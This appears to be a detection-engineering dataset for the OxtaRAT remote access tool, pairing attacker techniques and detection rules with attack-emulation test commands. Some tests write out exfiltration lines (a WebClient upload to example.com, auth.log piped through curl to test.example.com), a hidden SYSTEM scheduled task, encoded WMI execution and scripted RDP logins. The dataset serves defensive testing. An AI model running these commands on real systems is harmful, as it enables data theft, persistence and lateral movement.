extracted_ttps.description: Attacker used PowerShell to search for a pattern in a specified path

The threat actors used a remote access tool (OxtaRAT) to gain access to the victim's machine and perform various activities such as searching for and exfiltrating files, recording video from the web camera and desktop, and remotely controlling the compromised machine.
The malware uses a lure PDF file to trick the user into executing it
The malware (OxtaRAT) is a polyglot file that combines compiled AutoIT script and an image, which may involve modifying the registry to maintain persistence.
The malware (OxtaRAT) has the capability to perform port scanning, which can be used to discover open ports and running processes on the victim's machine.
The malware (OxtaRAT) has the capability to search for and exfiltrate files from the infected machine, which can be used to gather system information.
The malware is a self-extracting archive that masquerades as a PDF file, which is executed by the user
The malware (OxtaRAT) has the capability to record video from the web camera and desktop, which can be used to discover application windows.
Detected PowerShell activity via NLP pattern matching
The exec.bat script is used to execute commands and copy files
The malware copies files to the %appdata% directory, potentially modifying registry settings
Attacker collected system information, including system name, user name, and IP address
Detected Phishing activity via NLP pattern matching
Attacker used remote access tools, such as TightVNC, for remote control and monitoring
Attacker recorded video from the web camera or desktop for surveillance

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: Attacker exfiltrated files from the infected machine to the C&C server
Attacker collected system information, including processes, drives, and internet connection speed
Attacker used social engineering to trick the user into executing the malware
Detected Screen Capture activity via NLP pattern matching
Attacker discovered system owner and user information
Attacker created a scheduled task to maintain persistence
Detected Create or Modify System Process activity via NLP pattern matching
Attacker used Windows Command Shell to execute commands
Detected Application Layer Protocol activity via NLP pattern matching
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Windows Management Instrumentation activity via NLP pattern matching
Detected Network Service Discovery activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Scheduled Task/Job activity via NLP pattern matching
Detected Input Capture activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

rules.title: Detection: PowerShell
rules.description: Attacker used PowerShell to search for a pattern in a specified path

rules.title: OxtaRAT Remote Access Tool Detection
rules.description: Detects the use of OxtaRAT remote access tool, which is used by threat actors to gain access to victim machines and perform malicious activities.
falsepositives: Legitimate use of AutoIt for automation purposes
False positives may occur if oxtarat.exe is used for non-malicious purposes

rules.title: Detection: Phishing
rules.description: The malware uses a lure PDF file to trick the user into executing it

rules.title: Modify Registry via AutoIT Script
rules.description: Detects the execution of AutoIT scripts that may modify the registry for persistence
falsepositives: Legitimate AutoIT scripts executed during software installation or updates

rules.title: OxtaRAT Process Discovery via Port Scanning
rules.description: Detects OxtaRAT malware performing process discovery through port scanning using tools like nmap or netstat

rules.title: OxtaRAT System Information Discovery
rules.description: Detects system information discovery using OxtaRAT malware
falsepositives: Administrators running system information discovery commands for legitimate purposes
Power users running system information discovery commands for troubleshooting

rules.title: Detection of User Execution via Malicious PDF
rules.description: Identifies the execution of a self-extracting archive masquerading as a PDF file, which is executed by the user

rules.title: Detection: Application Window Discovery
rules.description: The malware (OxtaRAT) has the capability to record video from the web camera and desktop, which can be used to discover application windows.

rules.title: Detection: PowerShell
rules.description: Detected PowerShell activity via NLP pattern matching

rules.title: Command and Scripting Interpreter via exec.bat
rules.description: Detects the use of exec.bat to execute commands and copy files, which is a technique used by attackers to execute malicious commands and scripts
falsepositives: Scripting and automation tools using exec.bat

rules.title: Detection: Exfiltration Over Command and Control Channel
rules.description: Attacker exfiltrated files from the infected machine to the C&C server
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Detection: Data from Local System
rules.description: Attacker collected system information, including processes, drives, and internet connection speed

rules.title: Screen Capture Detection via Process Creation
rules.description: Detects screen capture activity through process creation events, focusing on known screen capture binaries and command line patterns.
falsepositives: Legitimate use of SnippingTool.exe or mspaint.exe for graphical editing
Administrative or support activities involving screen captures

rules.title: Detection: System Owner/User Discovery
rules.description: Attacker discovered system owner and user information

rules.title: Create or Modify System Process via Scheduled Task
rules.description: Detects the creation or modification of system processes through scheduled tasks, which can be used for persistence by attackers
falsepositives: Legitimate system administrators using 'schtasks.exe' for maintenance tasks

rules.title: Detection: Windows Command Shell
rules.description: Attacker used Windows Command Shell to execute commands

rules.title: Detection: Obfuscated Files or Information
rules.description: Detected Obfuscated Files or Information activity via NLP pattern matching

rules.title: Detection: Windows Management Instrumentation
rules.description: Detected Windows Management Instrumentation activity via NLP pattern matching

rules.title: Detection: Network Service Discovery
rules.description: Detected Network Service Discovery activity via NLP pattern matching

rules.title: Archive Collected Data Detection
rules.description: Detects Archive Collected Data activity via process creation and file write events

rules.title: Detection: Scheduled Task/Job
rules.description: Detected Scheduled Task/Job activity via NLP pattern matching

rules.title: Detection: Input Capture
rules.description: Detected Input Capture activity via NLP pattern matching

rules.title: Account Discovery via Command Line
rules.description: Detects Account Discovery activity via command line using net user, Get-LocalUser, or other relevant commands

rules.title: Remote Desktop Protocol Detection
rules.description: Detects Remote Desktop Protocol activity via process creation and command line analysis

rules.title: Detection of User Execution: Malicious File via NLP Pattern Matching
rules.description: Detects User Execution: Malicious File activity via NLP pattern matching as described in MITRE ATT&CK Technique T1204
falsepositives: Scripting activities by developers or power users

attacks.description: Basic file content search in TEMP directory for test pattern
attacks.expected_behavior: Lists lines containing 'test' in text files within user's TEMP folder

attacks.description: Intermediate search for error patterns in Documents logs
attacks.expected_behavior: Finds case-sensitive 'error' matches in accessible .log files under Documents

attacks.description: Advanced encoded command to search AppData config files
attacks.expected_behavior: Executes Base64-encoded script to find 'example' pattern in .config files under AppData

attacks.description: Basic PowerShell search for 'test' string in /var/log files
attacks.expected_behavior: Lists files in /var/log containing 'test'. No file modifications.

attacks.command: pwsh -Command "Try { Get-ChildItem -Path $HOME -Filter *.txt -ErrorAction Stop | Select-String 'example' | Out-File -FilePath ($HOME + '/results.txt') } Catch { Write-Output 'No files found' }"
attacks.description: Advanced search with error handling and output to $HOME/results.txt
attacks.expected_behavior: Searches user's home for 'example' in .txt files, writes results to ~/results.txt. Gracefully handles errors.

attacks.description: Downloads and executes mock RAT payload from remote server
attacks.expected_behavior: Downloads file from example.com (benign test domain), makes executable, and runs it. Simulates initial RAT installation.

attacks.description: Creates cron job for periodic RAT check-in
attacks.expected_behavior: Appends cron job that executes remote script every 5 minutes. Shows persistence mechanism for RAT communication.

attacks.description: Downloads a benign PDF file using certutil and opens it using the default PDF viewer
attacks.expected_behavior: The benign PDF file will be downloaded and opened

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.Text = 'Benign PDF'; $form.Size = New-Object System.Drawing.Size(300, 200); $button = New-Object System.Windows.Forms.Button; $button.Text = 'Open PDF'; $button.Size = New-Object System.Drawing.Size(100, 20); $button.Location = New-Object System.Drawing.Point(100, 80); $form.Controls.Add($button); $button.Add_Click({ Start-Process -FilePath '%TEMP%\benign.pdf' }); $form.ShowDialog()"
attacks.description: Creates a form with a button that opens a benign PDF file when clicked
attacks.expected_behavior: The form will be displayed, and when the button is clicked, the benign PDF file will be opened

attacks.description: Creates an HTML file with a link to a benign PDF file and opens it using the default browser
attacks.expected_behavior: The HTML file will be created, and when the link is clicked, the benign PDF file will be opened

attacks.description: Create a cron job that runs every minute to touch a file in /tmp, simulating persistence
attacks.expected_behavior: A new cron job is created, and a file is touched in /tmp every minute

attacks.description: Modify the system-wide bash configuration to alias ls to ls -l, simulating a registry modification
attacks.expected_behavior: The ls command now behaves like ls -l for all users

attacks.description: Create a cron job that runs a script daily, simulating a more complex persistence mechanism
attacks.expected_behavior: A new cron job is created, and a script is run daily, but this command assumes internet access and downloads a script, which is not recommended

attacks.description: Basic network connection and process listing using legacy utilities
attacks.expected_behavior: Displays all active network connections with process IDs followed by a list of running processes

attacks.command: powershell -Command "Get-Process | Format-Table Name, Id; Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }"
attacks.description: Intermediate process and TCP connection enumeration via PowerShell
attacks.expected_behavior: Lists running processes with names/IDs and shows established TCP connections

attacks.description: Advanced targeted port scan simulation using PowerShell
attacks.expected_behavior: Checks if ports 80 (HTTP), 443 (HTTPS), and 3389 (RDP) are open on localhost, returning True/False for each

attacks.description: Basic process listing showing all running processes
attacks.expected_behavior: Lists all running processes with user, PID, and command details in the terminal.

attacks.description: Intermediate network statistics showing listening ports and associated processes
attacks.expected_behavior: Displays all listening TCP/UDP ports with their associated process IDs and names. Requires root to see all processes.

attacks.description: Advanced TCP port scan of all ports on localhost
attacks.expected_behavior: Performs a full TCP port scan (1-65535) on localhost, identifying open ports and services. Assumes nmap is installed.

attacks.description: Collects basic system information (kernel, hostname, OS details)
attacks.expected_behavior: Outputs system information to standard output without creating files.

attacks.description: Gathers CPU/mount info into a file and lists configuration files
attacks.expected_behavior: Creates /tmp/system_info.txt with system data and lists .conf files in /etc (errors suppressed).

attacks.description: Archives configuration files from /etc using sudo
attacks.expected_behavior: Creates /tmp/configs.tar.gz containing matching files from /etc, suppressing permission errors.

attacks.command: echo 'This is a harmless script' > script.sh; chmod +x script.sh; ./script.sh
attacks.description: Basic: Create and execute a harmless script
attacks.expected_behavior: The script will be created, made executable, and then executed, printing the message to the terminal.

attacks.description: Intermediate: Download a harmless file, make it executable, and execute it
attacks.expected_behavior: The harmless PDF will be downloaded, made executable (though this will not actually work as expected since PDFs are not executable), and an attempt will be made to execute it, likely resulting in an error.

attacks.command: echo 'This is another harmless script' > script2.sh; chmod +x script2.sh; sudo ./script2.sh
attacks.description: Advanced: Create and execute a harmless script with elevated privileges
attacks.expected_behavior: The script will be created, made executable, and then executed with elevated privileges, printing the message to the terminal. Note that this requires the user to enter their password when prompted by sudo.

attacks.description: Lists processes with non-empty window titles to discover active application windows
attacks.expected_behavior: Outputs process names and window titles of applications with visible GUI windows.

attacks.description: Parses tasklist verbose output to extract window titles of running applications
attacks.expected_behavior: Displays lines containing 'Window Title:' from tasklist output, showing active application windows.

attacks.description: Starts Problem Steps Recorder to capture screen activity for 5 seconds
attacks.expected_behavior: Records screen activity into %TEMP%\capture.zip, simulating desktop recording capability.

attacks.description: List X11 window hierarchy showing open application windows
attacks.expected_behavior: Outputs tree structure of all X windows, revealing open application titles and positions

attacks.description: Capture desktop screenshot to timestamped file
attacks.expected_behavior: Creates PNG screenshot in /tmp showing current desktop state and visible application windows

attacks.description: Record 10-second desktop video using X11 capture
attacks.expected_behavior: Creates MP4 video file in /tmp capturing desktop activity including application window contents

attacks.description: Basic example of using PowerShell to get a list of running processes
attacks.expected_behavior: The command will execute and display a list of running processes in the PowerShell console.

attacks.description: Intermediate example of using PowerShell to create a file in the temp directory
attacks.expected_behavior: The command will create a file named 'test.txt' in the temp directory with the contents 'Hello World'.

attacks.description: Advanced example of using PowerShell to download a file from a URL
attacks.expected_behavior: The command will download the HTML content from the specified URL and save it to a file named 'example.html' in the temp directory.

attacks.description: Basic command to get running processes using PowerShell on Linux
attacks.expected_behavior: Lists running processes

attacks.description: Intermediate command to create a file using PowerShell on Linux, demonstrating the use of -Force for file operations
attacks.expected_behavior: Creates a file named testfile.txt in /tmp with the content 'Hello World', overwriting any existing file

attacks.description: Advanced command to download a webpage using PowerShell on Linux, assuming internet access for demonstration purposes
attacks.expected_behavior: Downloads the webpage http://example.com and saves it as example.html in /tmp

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Exfiltrate a test file over HTTP using PowerShell
attacks.expected_behavior: The command compresses a test file, then attempts to upload it to a specified URL.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Exfiltrate data using certutil and search for sensitive information
attacks.expected_behavior: The command downloads a file, then searches for specific strings within it, simulating data exfiltration and inspection.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "Set-Content -Path '%TEMP%\to_exfiltrate.txt' -Value 'Test data to exfiltrate.' -Force; $webclient = New-Object System.Net.WebClient; $webclient.UploadFile('http://example.com/exfiltrate', '%TEMP%\to_exfiltrate.txt')"
attacks.description: Create a file and exfiltrate it using a WebClient in PowerShell
attacks.expected_behavior: The command creates a test file, then attempts to upload it to a specified URL using a WebClient.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic file upload via HTTP POST to C2 server
attacks.expected_behavior: Uploads /tmp/testfile.txt to remote server using multipart form data

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration of sensitive file with base64 encoding
attacks.expected_behavior: Encodes /etc/shadow via base64 and POSTs to C2 server using sudo privileges

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: tar czf - /var/log/auth.log | openssl enc -base64 -pass pass:test | curl -T - http://test.example.com/stealth
attacks.description: Advanced stealth exfiltration with compression and encryption
attacks.expected_behavior: Compresses auth.log, base64-encrypts with test password, and streams to C2 via HTTP PUT

attacks.description: Gathers basic system information including OS version, hardware, and configuration.
attacks.expected_behavior: Displays system information in the command prompt.

attacks.description: Collects detailed network configuration information.
attacks.expected_behavior: Displays detailed network settings and configuration.

attacks.description: Utilizes PowerShell to query WMI for detailed operating system information.
attacks.expected_behavior: Displays detailed operating system information including version, build, and service pack details.

attacks.description: Basic system info collection: processes, disk usage, network interfaces
attacks.expected_behavior: Lists all running processes, disk space usage, and network interface statistics.

attacks.command: sudo ss -tnlp; sudo ethtool eth0; lscpu
attacks.description: Intermediate privileged discovery: listening ports, NIC details, CPU info
attacks.expected_behavior: Shows TCP listening sockets (needs root), Ethernet adapter capabilities, and CPU architecture details.

attacks.command: dd if=/dev/zero of=/tmp/speedtest bs=1M count=100 status=progress && rm /tmp/speedtest
attacks.description: Advanced disk speed test with cleanup
attacks.expected_behavior: Writes 100MB test file to measure disk I/O speed, then deletes the file. High safety risk due to disk write operations.

attacks.description: Display current user and group information
attacks.expected_behavior: Shows current user's UID, GID, and group memberships

attacks.description: List all local user accounts
attacks.expected_behavior: Outputs system user database including usernames, UIDs, home directories, and shells

attacks.description: Enumerate users with home directories (including network users)
attacks.expected_behavior: Lists all configured usernames and their home directories from local/network sources

attacks.description: Creates a scheduled task that runs notepad.exe at system logon using legacy schtasks.exe binary
attacks.expected_behavior: A scheduled task named 'Updater' is created and triggers notepad.exe each time the system starts. Requires elevated privileges to run as SYSTEM.

attacks.description: Creates a daily scheduled task running calc.exe via PowerShell using schtasks.exe
attacks.expected_behavior: A scheduled task named 'DailyMaintenance' is created to run calc.exe daily at 2:00 AM using PowerShell as a wrapper. Elevated privileges are required to create system-level tasks.

attacks.command: powershell -Command "try { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c start mshta.exe vbscript:Close(Execute('''window.close'''))'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden; Register-ScheduledTask -TaskName 'HTA_Loader' -Action $action -Trigger $trigger -User 'SYSTEM' -Settings $settings -Force } catch { }"
attacks.description: Uses PowerShell to create a hidden scheduled task that runs a benign HTA payload at logon
attacks.expected_behavior: A hidden scheduled task named 'HTA_Loader' is registered to execute a non-malicious HTA command at user logon. The task runs as SYSTEM and is not visible in standard task scheduler view. Requires admin rights to register as SYSTEM.

attacks.description: Execute a command that writes a test string to a file in the temp directory
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the contents 'Hello World'

attacks.description: Execute a PowerShell command that displays a message box with a test string
attacks.expected_behavior: A message box will pop up with the message 'Hello World'

attacks.description: Execute a command that writes the current username to a file in the temp directory
attacks.expected_behavior: A file named username.txt will be created in the temp directory with the current username

attacks.description: Obfuscate a file using certutil
attacks.expected_behavior: The command will create an encoded version of the test.txt file in the temporary directory.

attacks.description: Obfuscate a string using Base64 encoding and PowerShell
attacks.expected_behavior: The command will create a file named obfuscated.txt in the temporary directory containing the decoded string.

attacks.description: Obfuscate a file using a combination of cmd.exe and certutil
attacks.expected_behavior: The command will create a file named obfuscated.txt in the temporary directory, then create an encoded version of the file using certutil.

attacks.description: Basic WMI query to list running processes using legacy wmic.exe binary
attacks.expected_behavior: Outputs a list of running process names and their IDs to stdout. This is a standard reconnaissance command used to assess system state.

attacks.command: wmic /namespace:\\root\cimv2 path Win32_Process call create "cmd.exe /c echo WMI execution test & whoami > %TEMP%\wmi_test.txt"
attacks.description: Intermediate WMI command to execute a process via Win32_Process.Create method, writing output to a temporary file
attacks.expected_behavior: Creates a new process via WMI to run a command that echoes a test string and appends current user context to %TEMP%\wmi_test.txt. Simulates remote or scheduled execution without direct command line use.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c echo WMI encoded test > %TEMP%\\wmi_encoded.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); $wmiCmd = "wmic process call create \"powershell -EncodedCommand $encoded\""; cmd.exe /c $wmiCmd } catch { exit 1 }"
attacks.description: Advanced WMI execution using PowerShell-encoded command to obfuscate payload
attacks.expected_behavior: Encodes a benign command in Base64 (UTF-16LE), then uses WMI via wmic to execute PowerShell with -EncodedCommand. This simulates stealthy execution techniques seen in real attacks while staying within safe boundaries.

attacks.description: Basic WMI query to retrieve the operating system caption from a remote Windows host.
attacks.expected_behavior: The command returns the OS name (e.g., "Microsoft Windows 10 Pro") from the target machine without modifying any state.

attacks.description: Intermediate WMI command that creates a process on the remote Windows host to execute `whoami`.
attacks.expected_behavior: The remote Windows system runs `whoami` and returns the username of the account under which the process was created.

attacks.description: Advanced WMI usage that creates a remote process to write a benign test file into the target's temporary directory.
attacks.expected_behavior: A file named `test_wmi.txt` containing the text "TestFile" is created in the remote system's %TEMP% folder.

attacks.description: Display all active network connections and listening ports
attacks.expected_behavior: Lists all active connections and listening ports, aiding in network service discovery

attacks.description: List all started services
attacks.expected_behavior: Displays a list of started services, which can include network services

attacks.description: Query network configuration focusing on TCP connections
attacks.expected_behavior: Provides detailed information about TCP connections, including local and remote ports and the connection state

attacks.description: Basic compression of log files into a tarball
attacks.expected_behavior: Creates a compressed archive of all .log files in /var/log directory

attacks.description: Intermediate file discovery and incremental archiving
attacks.expected_behavior: Finds text/csv files in home directories and builds incremental tar archive before compression

attacks.description: Advanced encrypted archive of SSH configurations
attacks.expected_behavior: Creates encrypted archive of SSH configuration files using OpenSSL with test password

attacks.description: Create a daily scheduled task that runs a command to write a test string to a file in the temp directory
attacks.expected_behavior: A new scheduled task is created and runs daily, writing a test string to a file in the temp directory

attacks.description: Query the scheduled task to verify its existence and properties
attacks.expected_behavior: The scheduled task is queried and its properties are displayed

attacks.description: Delete the scheduled task
attacks.expected_behavior: The scheduled task is deleted

attacks.description: Open the cron table for editing to add a new scheduled task
attacks.expected_behavior: The cron table will be opened in the default editor, allowing the user to add a new scheduled task

attacks.description: Add a new scheduled task to run a command at midnight every day
attacks.expected_behavior: A new scheduled task will be added to the cron table to run the specified command at midnight every day

attacks.description: Open the cron table for editing with elevated privileges to add a new scheduled task
attacks.expected_behavior: The cron table will be opened in the default editor with elevated privileges, allowing the user to add a new scheduled task that runs with elevated privileges

attacks.description: Lists local user accounts on the system.
attacks.expected_behavior: Lists local user accounts.

attacks.description: Lists members of the local Administrators group.
attacks.expected_behavior: Lists members of the local Administrators group.

attacks.description: Lists domain user accounts. Requires domain-joined machine and admin privileges.
attacks.expected_behavior: Lists domain user accounts if the system is domain-joined and the command is run with sufficient privileges.

attacks.description: Basic RDP connection attempt using rdesktop
attacks.expected_behavior: Attempts RDP connection to 192.168.1.100 with test credentials. Will fail if target isn't listening on port 3389.

attacks.description: Intermediate FreeRDP connection with security negotiation bypass
attacks.expected_behavior: Establishes RDP session with NLA security and certificate validation disabled. May succeed if valid RDP server exists.

attacks.command: for ip in 192.168.1.100 192.168.1.101; do xfreerdp /v:$ip /u:testuser /p:'TestPass123!' & done
attacks.description: Advanced automated RDP connection attempts to multiple hosts
attacks.expected_behavior: Simulates lateral movement by attempting concurrent RDP connections to multiple hosts in background processes. Shows pattern of sequential targeting.

attacks.command: cmd.exe /c echo echo Test benign payload > %TEMP%\test.bat && %TEMP%\test.bat
attacks.description: Basic batch file creation and execution
attacks.expected_behavior: Creates test.bat in TEMP directory and executes it, generating a test file

attacks.description: Intermediate download and execute via certutil + PowerShell
attacks.expected_behavior: Downloads fake PowerShell script and executes it with execution policy bypass

attacks.command: schtasks /create /tn "Test Task" /tr "powershell -Command \"Write-Output 'Benign task' | Out-File $env:TEMP\task_output.txt\"" /sc hourly /ru SYSTEM
attacks.description: Advanced scheduled task execution
attacks.expected_behavior: Creates hourly scheduled task that writes to TEMP directory, requires admin privileges

attacks.description: Basic remote script download and execution via bash
attacks.expected_behavior: Downloads sample.sh from example.com and executes it in bash. Shows test execution pattern without harmful effects.

attacks.description: Intermediate local script creation and execution
attacks.expected_behavior: Creates harmless test.sh in /tmp, makes it executable, and runs it. Demonstrates file write -> execute workflow.

attacks.description: Advanced base64-encoded script execution
attacks.expected_behavior: Decodes base64 string (echo 'Test encoded execution') and executes via bash. Mimics payload obfuscation techniques.
